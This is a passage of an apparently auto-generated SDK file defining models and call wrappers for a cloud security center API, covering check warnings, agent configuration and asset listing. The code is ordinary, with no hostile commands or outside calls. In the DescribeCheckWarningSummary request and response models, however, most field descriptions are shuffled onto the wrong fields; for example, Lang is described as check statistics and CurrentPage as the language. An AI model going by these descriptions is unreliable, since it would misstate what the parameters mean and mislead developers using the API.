  ](name='Machines', description='An array consisting of the servers on which the same risk item is detected.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B3D989EB-2E59-584C-8438-5DFAA34A****'),
}

model DescribeCheckWarningMachinesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCheckWarningMachinesResponseBody(name='body'),
}

async function describeCheckWarningMachinesWithOptions(request: DescribeCheckWarningMachinesRequest, runtime: Util.RuntimeOptions): DescribeCheckWarningMachinesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCheckWarningMachines',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCheckWarningMachines(request: DescribeCheckWarningMachinesRequest): DescribeCheckWarningMachinesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckWarningMachinesWithOptions(request, runtime);
}

model DescribeCheckWarningSummaryRequest {
  clusterId?: string(name='ClusterId', description='The value of the container field.', example='c80dae73bd1be442699766b14ffd0****'),
  containerFieldName?: string(name='ContainerFieldName', description='The level-1 type of check items.

>  You can call the [DescribeRiskType](~~DescribeRiskType~~) operation to query the level-1 types of check items.', example='namespace'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The ID of the baseline check policy.', example='c819391d2d520485fa3e81e2dc2ea****'),
  currentPage?: int32(name='CurrentPage', description='The language of the content within the request and the response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='1'),
  groupId?: long(name='GroupId', example='123'),
  lang?: string(name='Lang', description='The statistics of check items.', example='zh'),
  pageSize?: int32(name='PageSize', description='The UUID of the asset.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of assets.', example='10'),
  riskName?: string(name='RiskName', description='The level-2 type of the risk item.', example='Redis'),
  riskStatus?: int32(name='RiskStatus', description='The type of the query condition. Valid values:

*   **uuid**: the ID of an asset', example='1'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='219.133.XX.XX'),
  status?: string(name='Status', description='The number of high-risk items.', example='1'),
  strategyId?: long(name='StrategyId', description='The number of assets on which risk items are detected.', example='1'),
  targetType?: string(name='TargetType', description='The number of check items.', example='uuid'),
  typeName?: string(name='TypeName', description='The page number of the current page.', example='database'),
  uuids?: string(name='Uuids', description='The name of the container field. Valid values:

*   **clusterId**: the ID of the cluster
*   **image**: the name of the image
*   **imageId**: the ID of the image
*   **namespace**: the namespace', example='f03259d8-1e81-4fae-bcbb-275fb5****'),
}

model DescribeCheckWarningSummaryResponseBody = {
  count?: int32(name='Count', description='The level-1 type of the check item. Examples: database, system, weak password, and middleware.', example='10'),
  currentPage?: int32(name='CurrentPage', description='Indicates whether the risk item can be exploited. Valid values:

*   **true**: yes
*   **false**: no', example='1'),
  pageSize?: int32(name='PageSize', description='The ID of the container cluster.

>  You can call the [DescribeGroupedContainerInstances](~~182997~~) operation to query the IDs of container clusters.', example='10'),
  requestId?: string(name='RequestId', description='The number of entries to return on each page.', example='00BD7CE2-284A-4534-BD09-FB69836DD750'),
  totalCount?: int32(name='TotalCount', description='The ID of the risk item.', example='100'),
  warningSummarys?: [ 
    {
      checkCount?: int32(name='CheckCount', description='The statistics of check items.', example='10'),
      checkExploit?: boolean(name='CheckExploit', example='false'),
      containerRisk?: boolean(name='ContainerRisk', example='false'),
      databaseRisk?: boolean(name='DatabaseRisk', example='false'),
      highWarningCount?: int32(name='HighWarningCount', example='1'),
      lastFoundTime?: string(name='LastFoundTime', description='The number of low-risk items.', example='2019-01-01 12:23:00'),
      level?: string(name='Level', example='high'),
      lowWarningCount?: int32(name='LowWarningCount', description='The number of entries to return on each page.', example='3'),
      mediumWarningCount?: int32(name='MediumWarningCount', description='The ID of the request, which is used to locate and troubleshoot issues.', example='2'),
      riskId?: long(name='RiskId', description='The number of check items returned on the current page.', example='118'),
      riskName?: string(name='RiskName', example='Redis'),
      subTypeAlias?: string(name='SubTypeAlias', description='Queries the statistical information about baseline check results. The information includes the number of servers on which a baseline check is performed, the number of baseline check items, and the pass rate of check items in the last baseline check.', example='Redis'),
      typeAlias?: string(name='TypeAlias', example='databases'),
      warningMachineCount?: int32(name='WarningMachineCount', description='DescribeCheckWarningSummary', example='11'),
    }
  ](name='WarningSummarys', description='The number of medium-risk items.'),
}

model DescribeCheckWarningSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCheckWarningSummaryResponseBody(name='body'),
}

async function describeCheckWarningSummaryWithOptions(request: DescribeCheckWarningSummaryRequest, runtime: Util.RuntimeOptions): DescribeCheckWarningSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskName)) {
    query['RiskName'] = request.riskName;
  }
  if (!Util.isUnset(request.riskStatus)) {
    query['RiskStatus'] = request.riskStatus;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.typeName)) {
    query['TypeName'] = request.typeName;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCheckWarningSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCheckWarningSummary(request: DescribeCheckWarningSummaryRequest): DescribeCheckWarningSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckWarningSummaryWithOptions(request, runtime);
}

model DescribeCheckWarningsRequest {
  checkId?: long(name='CheckId', description='The ID of the check item.', example='2546'),
  checkType?: string(name='CheckType', description='The type of the check item. Valid values:

*   **hc.check.type.identity_auth**: identity authentication
*   **hc.check.type.access_control**: access control
*   **hc.check.type.network_service**: network and service
*   **hc.check.type.service_conf**: service configuration
*   **hc.check.type.file_rights**: file permission
*   **hc.check.type.security_audit**: security audit
*   **hc.check.type.attack_defense**: intrusion prevention
*   **hc.check.type.others**: others', example='hc.check.type.attack_defense'),
  containerName?: string(name='ContainerName', description='The name of container.', example='/redis'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  riskId?: long(name='RiskId', description='The ID of the baseline risk item.

> To query specified baseline risk items and the check items of a specified server, you must provide the IDs of the baseline risk items. You can call the [DescribeCheckWarningSummary](~~DescribeCheckWarningSummary~~) operation to query the IDs.', example='10354'),
  riskStatus?: int32(name='RiskStatus', description='The status of the check item. Valid values:

*   **1**: failed
*   **2**: verifying
*   **3**: passed
*   **5**: expired
*   **6**: ignored', example='1'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  uuid?: string(name='Uuid', description='The UUID of the server on which the baseline check is performed.

> To query specified risk items and the check items of a specified server, you must provide the ID of the server on which the baseline check is performed. You can call the [DescribeWarningMachines](~~DescribeWarningMachines~~) operation to query the IDs of servers.', example='d42f938c-d962-48a0-90f9-05****'),
}

model DescribeCheckWarningsResponseBody = {
  checkWarnings?: [ 
    {
      checkId?: long(name='CheckId', description='The ID of the check item.', example='2546'),
      checkWarningId?: long(name='CheckWarningId', description='The ID of the alert that is triggered by the check item.', example='212251441'),
      execErrorMessage?: string(name='ExecErrorMessage', description='The error message in check result.', example='ScriptKilledOfCpuHigh'),
      fixStatus?: int32(name='FixStatus', description='The fixing status of the check item. Valid values:

*   **0**: disabled
*   **1**: enabled', example='0'),
      item?: string(name='Item', description='The name of the check item.', example='passwordExpire'),
      level?: string(name='Level', description='The risk level of the risk item. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
      reason?: string(name='Reason', description='The description of the check item.', example='ignore'),
      status?: int32(name='Status', description='The status of the check item. Valid values:

*   **1**: failed
*   **2**: verifying
*   **3**: passed
*   **5**: expired
*   **6**: ignored', example='1'),
      type?: string(name='Type', description='The type of the check item.', example='hc.check.type.identity_auth'),
      uuid?: string(name='Uuid', description='The UUID of the server on which the baseline check is performed.', example='d42f938c-d962-48a0-90f9-****'),
    }
  ](name='CheckWarnings', description='An array that consists of the details about the check item.'),
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0DFCADBA-7065-42DA-AF17-6868B9C2A8CF'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
}

model DescribeCheckWarningsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCheckWarningsResponseBody(name='body'),
}

async function describeCheckWarningsWithOptions(request: DescribeCheckWarningsRequest, runtime: Util.RuntimeOptions): DescribeCheckWarningsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.checkType)) {
    query['CheckType'] = request.checkType;
  }
  if (!Util.isUnset(request.containerName)) {
    query['ContainerName'] = request.containerName;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.riskStatus)) {
    query['RiskStatus'] = request.riskStatus;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCheckWarnings',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCheckWarnings(request: DescribeCheckWarningsRequest): DescribeCheckWarningsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckWarningsWithOptions(request, runtime);
}

model DescribeClientConfSetupRequest {
  strategyTag?: string(name='StrategyTag', description='The tag that is added to the server.', example='machineResource'),
  strategyTagValue?: string(name='StrategyTagValue', description='The value of the tag. Valid values:

*   major
*   advanced
*   basic', example='major'),
}

model DescribeClientConfSetupResponseBody = {
  clientConf?: {
    config?: string(name='Config', description='The configurations of the usage for the Security Center agent.', example='{"mem":"200","cpu":"10","cpu_all":"0"}'),
    strategyTag?: string(name='StrategyTag', description='The tag that is added to the configuration.', example='machineResource'),
    strategyTagValue?: string(name='StrategyTagValue', description='The value of the tag. Valid values:

*   major
*   advanced
*   basic', example='major'),
  }(name='ClientConf', description='The configurations of the Security Center agent.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='151F6EB6-D5F3-417A-AF7B-4D84975D****'),
}

model DescribeClientConfSetupResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeClientConfSetupResponseBody(name='body'),
}

async function describeClientConfSetupWithOptions(request: DescribeClientConfSetupRequest, runtime: Util.RuntimeOptions): DescribeClientConfSetupResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.strategyTag)) {
    query['StrategyTag'] = request.strategyTag;
  }
  if (!Util.isUnset(request.strategyTagValue)) {
    query['StrategyTagValue'] = request.strategyTagValue;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClientConfSetup',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeClientConfSetup(request: DescribeClientConfSetupRequest): DescribeClientConfSetupResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClientConfSetupWithOptions(request, runtime);
}

model DescribeClientConfStrategyRequest {
  tag?: string(name='Tag', description='The tag that is added to the server.', example='machineResource'),
  tagValue?: string(name='TagValue', description='The value of the tag. Valid values:

*   major
*   advanced
*   basic', example='major'),
}

model DescribeClientConfStrategyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5BD95679-D63A-4151-97D0-188432F****'),
  targetList?: [ 
    {
      uuid?: string(name='Uuid', description='The UUID of the Security Center agent.', example='2b1753a6-04d9-448e-ad17-7abdf19f****'),
    }
  ](name='TargetList', description='An array that consists of the configurations.'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
}

model DescribeClientConfStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeClientConfStrategyResponseBody(name='body'),
}

async function describeClientConfStrategyWithOptions(request: DescribeClientConfStrategyRequest, runtime: Util.RuntimeOptions): DescribeClientConfStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.tag)) {
    query['Tag'] = request.tag;
  }
  if (!Util.isUnset(request.tagValue)) {
    query['TagValue'] = request.tagValue;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClientConfStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeClientConfStrategy(request: DescribeClientConfStrategyRequest): DescribeClientConfStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClientConfStrategyWithOptions(request, runtime);
}

model DescribeCloudCenterInstancesRequest {
  criteria?: string(name='Criteria', description='The search conditions that are used to filter assets. The value of this parameter is in the JSON format and is case-sensitive.

> A search condition can be an instance ID, instance name, VPC ID, region, or public IP address. You can call the [DescribeCriteria](~~DescribeCriteria~~) operation to query the supported search conditions.', example='[{"name":"riskStatus","value":"YES"},{"name":"internetIp","value":"1.2.XX.XX"}]'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  importance?: int32(name='Importance', description='The importance level of the asset. Valid values:

*   **2**: an important asset
*   **1**: a common asset
*   **0**: a test asset', example='2'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  logicalExp?: string(name='LogicalExp', description='The logical operator that you want to use to evaluate multiple search conditions. Default value: **OR**. Valid values:

*   **OR**: The search conditions are evaluated by using a logical **OR**.
*   **AND**: The search conditions are evaluated by using a logical **AND**.', example='OR'),
  machineTypes?: string(name='MachineTypes', description='The type of the assets that you want to query. Valid values:

*   **ecs**: servers
*   **cloud_product**: Alibaba Cloud services', example='ecs'),
  noGroupTrace?: boolean(name='NoGroupTrace', description='Specifies whether to internationalize the name of the **default** group. Default value: **false**. Valid values:

*   **true**: The system returns the Chinese name of the default group for the **GroupTrace** response parameter.********
*   **false**: The system returns default for the **GroupTrace** response parameter.', example='false'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='100'),
  regionId?: string(name='RegionId', description='The ID of the region in which the asset resides.', example='cn-hangzhou'),
}

model DescribeCloudCenterInstancesResponseBody = {
  instances?: [ 
    {
      alarmStatus?: string(name='AlarmStatus', description='Indicates whether alerts are generated on the asset. Valid values:

*   **YES**
*   **NO**', example='NO'),
      assetType?: string(name='AssetType', description='The type of the asset. Valid values:

*   **0**: an ECS instance
*   **1**: a Server Load Balancer (SLB) instance
*   **2**: a NAT gateway
*   **3**: an ApsaraDB RDS instance
*   **4**: an ApsaraDB for MongoDB instance
*   **5**: an ApsaraDB for Redis instance
*   **6**: a container image
*   **7**: a container', example='0'),
      authModifyTime?: long(name='AuthModifyTime', description='The timestamp when Security Center is authorized to scan the asset. Unit: milliseconds.', example='1627974044000'),
      authVersion?: int32(name='AuthVersion', description='The edition of Security Center that is authorized to protect the asset. Valid values:

*   **1**: Basic edition
*   **6**: Anti-virus edition
*   **5**: Advanced edition
*   **3**: Enterprise edition
*   **7**: Ultimate edition', example='1'),
      authVersionName?: string(name='AuthVersionName', description='The name of the Security Center edition that is authorized to scan the asset. Valid values:

*   Basic edition
*   Anti-virus edition
*   Advanced edition
*   Enterprise edition
*   Ultimate edition
*   Value-added Plan edition', example='Ultimate Edition'),
      bind?: boolean(name='Bind', description='Indicates whether Security Center is authorized to protect the asset. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      clientStatus?: string(name='ClientStatus', description='The status of the Security Center agent installed on the asset. Valid values:

*   **online**: The Security Center agent is **enabled**.
*   **offline**: The Security Center agent is **disabled**.
*   **pause**: The Security Center agent is **suspended**.', example='online'),
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c690a0789419f4284a4e0a29e12fe****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='cluster1'),
      cores?: int32(name='Cores', description='The number of the CPU cores for the asset.', example='4'),
      cpuInfo?: string(name='CpuInfo', description='The CPU information about the asset.', example='Intel(R) Xeon(R) Platinum 8269CY CPU @ 2.50GHz'),
      createdTime?: long(name='CreatedTime', description='The timestamp when the cluster was created. Unit: milliseconds.', example='1607365213000'),
      exposedStatus?: int32(name='ExposedStatus', description='Indicates whether the asset is exposed. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
      flag?: int32(name='Flag', description='Indicates whether the asset is an Alibaba Cloud asset. Valid values:

*   **0**: yes
*   **1**: no', example='0'),
      groupId?: long(name='GroupId', description='The ID of the asset group to which the asset belongs.', example='4120080'),
      groupTrace?: string(name='GroupTrace', description='The name of the group to which the asset belongs.', example='default'),
      hcStatus?: string(name='HcStatus', description='Indicates whether baseline risk items are detected on the asset. Valid values:

*   **YES**
*   **NO**', example='YES'),
      healthCheckCount?: int32(name='HealthCheckCount', description='The number of baseline risks that are detected on the asset.', example='1'),
      importance?: int32(name='Importance', description='The importance level of the asset. Valid values:

*   **2**: an important asset
*   **1**: a common asset
*   **0**: a test asset', example='2'),
      instanceId?: string(name='InstanceId', description='The ID of the asset.', example='i-m5***'),
      instanceName?: string(name='InstanceName', description='The name of the asset.', example='yztest-l***'),
      internetIp?: string(name='InternetIp', description='The public IP address of the asset.', example='1.2.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the asset.', example='1.2.XX.XX'),
      ip?: string(name='Ip', description='The public IP address of the asset.', example='1.2.XX.XX'),
      ipListString?: string(name='IpListString', description='The IP addresses of the system.', example='172.31.XX.XX,172.171.XX.XX'),
      kernel?: string(name='Kernel', description='The version of the kernel.', example='3.10.0-1127.19.1.el7.x86_64'),
      lastLoginTimestamp?: long(name='LastLoginTimestamp', description='The timestamp when the Security Center agent was last online. Unit: milliseconds.', example='1637592907000'),
      macListString?: string(name='MacListString', description='The MAC address of the system.', example='00:13:3e:31:13:39,02:12:67:b8:**:**'),
      mem?: int32(name='Mem', description='The memory size. Unit: MB.', example='1024'),
      os?: string(name='Os', description='The operating system of the asset.', example='Linux'),
      osName?: string(name='OsName', description='The version of the operating system that the asset runs.', example='-'),
      podCount?: int32(name='PodCount', description='The number of pods.', example='1'),
      region?: string(name='Region', description='The region ID of the asset.', example='cn-hangzhou-cm***-***'),
      regionId?: string(name='RegionId', description='The ID of the region in which the asset resides.', example='cn-hanghzou'),
      regionName?: string(name='RegionName', description='The name of the region in which the asset resides.', example='China (Hangzhou)'),
      riskCount?: string(name='RiskCount', description='The statistics about baseline risks that are detected on the asset. The value of this parameter is in the JSON format and contains the following fields:

*   **account**: the number of accounts that are used to log on from unapproved logon locations and whose passwords are cracked
*   **appNum**: the number of scanners
*   **asapVulCount**: the total number of high-risk vulnerabilities
*   **baselineHigh**: the number of high-risk baseline risks
*   **baselineLow**: the number of low-risk baseline risks
*   **baselineMedium**: the number of medium-risk baseline risks
*   **baselineNum**: the total number of baseline risks
*   **cmsNum**: the number of Web-CMS vulnerabilities
*   **containerAsap**: the number of high-risk vulnerabilities that are detected on containers
*   **containerLater**: the number of medium-risk vulnerabilities that are detected on containers
*   **containerNntf**: the number of low-risk vulnerabilities that are detected on containers
*   **containerRemind**: the number of alerts whose Emergency level is Reminder on containers
*   **containerSerious**: the number of alerts whose Emergency level is Urgent on containers
*   **containerSuspicious**: the number of alerts whose Emergency level is Suspicious on containers
*   **cveNum**: the number of Linux software vulnerabilities
*   **emgNum**: the number of urgent vulnerabilities
*   **health**: the number of baseline risks that are unhandled
*   **imageBaselineHigh**: the number of high-risk baseline risks that are detected on images
*   **imageBaselineLow**: the number of low-risk baseline risks that are detected on images
*   **imageBaselineMedium**: the number of medium-risk baseline risks that are detected on images
*   **imageBaselineNum**: the total number of baseline risks that are detected on images
*   **imageMaliciousFileRemind**: the number of malicious files that are detected on images and have the Emergency level of Reminder
*   **imageMaliciousFileSerious**: the number of malicious files that are detected on images and have the Emergency level of Urgent
*   **imageMaliciousFileSuspicious**: the number of malicious files that are detected on images and have the Emergency level of Suspicious
*   **imageVulAsap**: the number of high-risk vulnerabilities that are detected on images
*   **imageVulLater**: the number of medium-risk vulnerabilities that are detected on an image
*   **imageVulNntf**: the number of low-risk vulnerabilities that are detected on an image
*   **laterVulCount**: the number of medium-risk vulnerabilities
*   **newSuspicious**: the number of alerts
*   **nntfVulCount**: the number of low-risk vulnerabilities
*   **remindNum**: the number of alerts whose Emergency level is Reminder
*   **scaNum**: the number of vulnerabilities that are detected based on software component analysis
*   **seriousNum**: the number of alerts whose Emergency level is Urgent
*   **suspNum**: the number of alerts whose Emergency level is Suspicious
*   **suspicious**: the total number of alerts
*   **sysNum**: the number of Windows system vulnerabilities
*   **trojan**: the number of trojans
*   **uuid**: the UUID of the asset
*   **vul**: the number of vulnerabilities
*   **weakPWNum**: the number of weak passwords', example='{"account":0,"appNum":0,"asapVulCount":0,"baselineHigh":0,"baselineLow":0,"baselineMedium":0,"baselineNum":0,"cmsNum":0,"containerAsap":0,"containerLater":0,"containerNntf":0,"containerRemind":0,"containerSerious":0,"containerSuspicious":0,"cveNum":0,"emgNum":0,"health":0,"imageBaselineHigh":0,"imageBaselineLow":0,"imageBaselineMedium":0,"imageBaselineNum":0,"imageMaliciousFileRemind":0,"imageMaliciousFileSerious":0,"imageMaliciousFileSuspicious":0,"imageVulAsap":0,"imageVulLater":0,"imageVulNntf":0,"laterVulCount":0,"newSuspicious":0,"nntfVulCount":0,"remindNum":0,"scaNum":0,"seriousNum":0,"suspNum":0,"suspicious":0,"sysNum":0,"trojan":0,"uuid":"inet-37316411-37fe-4b72-b245-346a2721d4b6","vul":0,"weakPWNum":0}'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether risks are detected on the asset. Valid values:

*   **YES**
*   **NO**', example='NO'),
      safeEventCount?: int32(name='SafeEventCount', description='The number of alerts that are generated on the asset.', example='5'),
      status?: string(name='Status', description='The status of the asset. Valid values:

*   **Running**: running
*   **notRunning**: stopped', example='Running'),
      tag?: string(name='Tag', description='The name of the asset tag.', example='InternetIp,test'),
      tagId?: string(name='TagId', description='The ID of the asset tag.', example='121313,41412'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='c9107c04-942f-40c1-981a-f1c1***'),
      vendor?: int32(name='Vendor', description='The category of the service provider (SP) for the asset. Valid values:

*   **0**: The asset is provided by Alibaba Cloud.
*   **1**: The asset is not provided by Alibaba Cloud.
*   **2**: The asset resides in a data center.
*   **3**, **4**, **5**, and **7**: other cloud asset.
*   **8**: a light-weight asset.', example='0'),
      vendorName?: string(name='VendorName', description='The name of the SP for the asset.

Valid values:

*   **ALIYUN**: Alibaba Cloud
*   **OUT**: a third-party service provider
*   **IDC**: a data center
*   **TENCENT**: Tencent Cloud
*   **HUAWEICLOUD**: HUAWEI CLOUD
*   **Microsoft**: Microsoft Azure
*   **AWS**: Amazon Web Services (AWS)
*   **TRIPARTITE**: a lightweight server', example='IDC'),
      vpcInstanceId?: string(name='VpcInstanceId', description='The ID of the VPC to which the asset belongs.', example='vpc-uf60agqq65bs98zoo****'),
      vulCount?: int32(name='VulCount', description='The number of vulnerabilities that are detected on the asset.', example='2'),
      vulStatus?: string(name='VulStatus', description='Indicates whether vulnerabilities are detected on the asset. Valid values:

*   **YES**
*   **NO**', example='YES'),
    }
  ](name='Instances', description='An array that consists of the details about the assets.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='50'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='32A73759-4C0F-4801-BE98-901223ACEE9A'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DescribeCloudCenterInstancesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCloudCenterInstancesResponseBody(name='body'),
}

/**
  * You can search for assets by using search conditions, such as the instance ID, instance name, virtual private cloud (VPC) ID, region, and public IP address. You can also configure a logical relationship between multiple search conditions to search for the assets that meet the search conditions.
  *
  * @param request DescribeCloudCenterInstancesRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeCloudCenterInstancesResponse
 */
async function describeCloudCenterInstancesWithOptions(request: DescribeCloudCenterInstancesRequest, runtime: Util.RuntimeOptions): DescribeCloudCenterInstancesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.importance)) {
    query['Importance'] = request.importance;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.machineTypes)) {
    query['MachineTypes'] = request.machineTypes;
  }
  if (!Util.isUnset(request.noGroupTrace)) {
    query['NoGroupTrace'] = request.noGroupTrace;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCloudCenterInstances',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * You can search for assets by using search conditions, such as the instance ID, instance name, virtual private cloud (VPC) ID, region, and public IP address. You can also configure a logical relationship between multiple search conditions to search for the assets that meet the search conditions.
  *
  * @param request DescribeCloudCenterInstancesRequest
  * @return DescribeCloudCenterInstancesResponse
 */
async function describeCloudCenterInstances(request: DescribeCloudCenterInstancesRequest): DescribeCloudCenterInstancesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCloudCenterInstancesWithOptions(request, runtime);
}

model DescribeCloudProductFieldStatisticsResponseBody = {
  groupedFields?: {
    categoryCount?: string(name='CategoryCount', example='[{"MachineType":1,"Count":11}]'),
    instanceCount?: int32(name='InstanceCount', example='100'),
    riskInstanceCount?: int32(name='RiskInstanceCount', example='90'),
  }(name='GroupedFields'),
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

